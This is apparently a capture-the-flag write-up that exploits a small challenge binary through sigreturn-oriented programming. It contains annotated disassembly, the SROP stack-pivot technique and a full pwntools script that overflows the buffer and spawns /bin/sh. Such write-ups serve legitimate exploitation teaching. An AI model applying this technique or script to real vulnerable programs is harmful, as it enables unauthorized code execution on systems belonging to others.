We will start by inspecting the assembly of our binary. 

Commented output of `objdump -d -M intel srop`

```
0000000000401000 <_start>:
  401000:       e8 08 00 00 00          call   40100d <main>
# Call exit syscall
  401005:       b8 3c 00 00 00          mov    eax,0x3c
  40100a:       0f 05                   syscall 
  40100c:       c3                      ret    

000000000040100d <main>:
# Setup a stackframe of size 8
# Allocates a buffer of size 8
  40100d:       55                      push   rbp
  40100e:       48 89 e5                mov    rbp,rsp
  401011:       48 83 ec 08             sub    rsp,0x8
# Call _read(buffer)
  401015:       48 8d 7d f8             lea    rdi,[rbp-0x8]
  401019:       e8 05 00 00 00          call   401023 <_read>
  40101e:       48 89 ec                mov    rsp,rbp
  401021:       5d                      pop    rbp
  401022:       c3                      ret    

0000000000401023 <_read>:
# Call the syscall read(0, buffer, 0x200)
  401023:       55                      push   rbp
  401024:       48 89 e5                mov    rbp,rsp
  401027:       48 83 ec 08             sub    rsp,0x8
  40102b:       48 89 fe                mov    rsi,rdi
  40102e:       bf 00 00 00 00          mov    edi,0x0
  401033:       ba 00 02 00 00          mov    edx,0x200
  401038:       b8 00 00 00 00          mov    eax,0x0
  40103d:       0f 05                   syscall 
  40103f:       48 89 ec                mov    rsp,rbp
  401042:       5d                      pop    rbp
  401043:       c3                      ret    
```

This binary is very small and is especially challenging. It just reads a string
from the user, does nothing with it, then exits. There is a buffer overflow when
we call the read syscall since our buffer is only 8 bytes long. However, it's
difficult to do anything with this buffer overflow.

There is a significant lack of ROP gadgets in this binary and we cannot jump to
libc since libc is not even linked. We can still exploit this problem with a
technique known as sigreturn oriented programming.

Sigreturn is a syscall used by Linux signal handlers when context switching.
When a program is interrupted, the kernel pushes the entire execution context
onto the stack then jumps to the signal handler. When the signal handler is
finished, it calls sigreturn which restores the execution state from the stack.

The idea behind sigreturn oriented programming is that if we can call sigreturn
with a forged sigreturn struct at RSP, we can populate every register with user
controlled values.

With this idea in mind, we first need to figure out how to call the sigreturn
syscall. The syscall number for `sigreturn` is `0xf`. There are `syscall`
gadgets in our binary, so the first challenge is just to set `rax = 0xf`.
Fortunately for us, the `read` syscall sets `rax` to the number of bytes read.
Consider the following ROP chain:

```
[ overflow bytes  ]
[ saved rbp       ]
[ main            ] <== rsp
[ syscall         ]
[ sigreturn frame ]
```

This ropchain will call main, we can enter 15 bytes. This will set `rax = 0xf`
then the ropchain will perform a syscall. Notice that by this point `RSP` will
be pointing to the top of our fake sigreturn frame. So this rop chain will
properly call sigreturn and will give us control over all registers.

The next challenge is to figure out how to actually exploit this program. There
are probably several ways to solve this problem (mprotect, execve, etc). I chose
to use execve for simplicity. To call `execve('/bin/sh')` we need to write
`/bin/sh` to a known address in memory. To do this, I used the sigreturn call to
change `RSP` and `RBP` to static writeable addresses, then called main again.
The sigreturn frame looks something like this:

```
[RIP -> main]
[RBP -> .bss] (.bss is a writeable section located at 0x402000)
[RSP -> .bss] (check readelf -S srop for more info)
```

Now we're just executing main, but we know `RSP` and `RBP`. We can reuse our
original ropchain with the string `/bin/sh` appended. This time our sigreturn
frame will look something like this. We will also append a pointer to the
`/bin/sh` string so properly set the argv value for execve.

```
[RIP -> syscall gadget]
[RBP -> .bss] (.bss is a writeable section located at 0x402000)
[RSP -> .bss] (check readelf -S srop for more info)
[RDI -> /bin/sh string]
[RSI -> pointer to /bin/sh]
[RDX -> NULL]
```

After this ropchain executes, we'll call `execve('/bin/sh', {'/bin/sh', NULL}, NULL)`.

Here's the code
```python
from pwn import *

r = process("./srop")
e = ELF("./srop")
rop = ROP(e)

context.clear(arch='amd64')
context.terminal = ["tmux", "splitw", "-h"]

# Middle of the bss segment
# We can't use the beginning because the stack grows downward
# We can't use the end because the string we're writing grows upward
writeable = e.bss() + (0x1000 // 2)

# Sigreturn frame for stack pivot
frame = SigreturnFrame()
frame.rbp = writeable
frame.rsp = writeable
frame.rip = (e.symbols["main"])

# Payload to execute stack pivot
payload = 0x10*b'a'
payload += p64(e.symbols["main"])
payload += p64(rop.find_gadget(["syscall"])[0])
payload += bytes(frame)

# Sleep because I had issues with some sort of race condition
r.sendline(payload)
sleep(1)

# Sigreturn is syscall 0xf
# -1 due to the newline
syscall = 0xf-1
r.sendline(b'a'*syscall)
sleep(1)

# Sigreturn frame for calling execve
frame = SigreturnFrame()
frame.rbp = writeable
frame.rsp = writeable
frame.rip = (rop.find_gadget(["syscall"])[0])
# Execve is syscall number 59
frame.rax = 59
# I just calculated these addresses in gdb
frame.rdi = e.bss() + 0x908
frame.rsi = e.bss() + 0x910
frame.rdx = e.bss()

# Payload to run execve
payload = 0x10*b'b'
payload += p64(e.symbols["main"])
payload += p64(rop.find_gadget(["syscall"])[0])
payload += bytes(frame) + b'/bin/sh\x00' + p64(e.bss() + 0x908) + p64(0)

r.sendline(payload)
sleep(1)

syscall = 0xf-1
r.sendline(b'c'*syscall)

r.interactive()
```
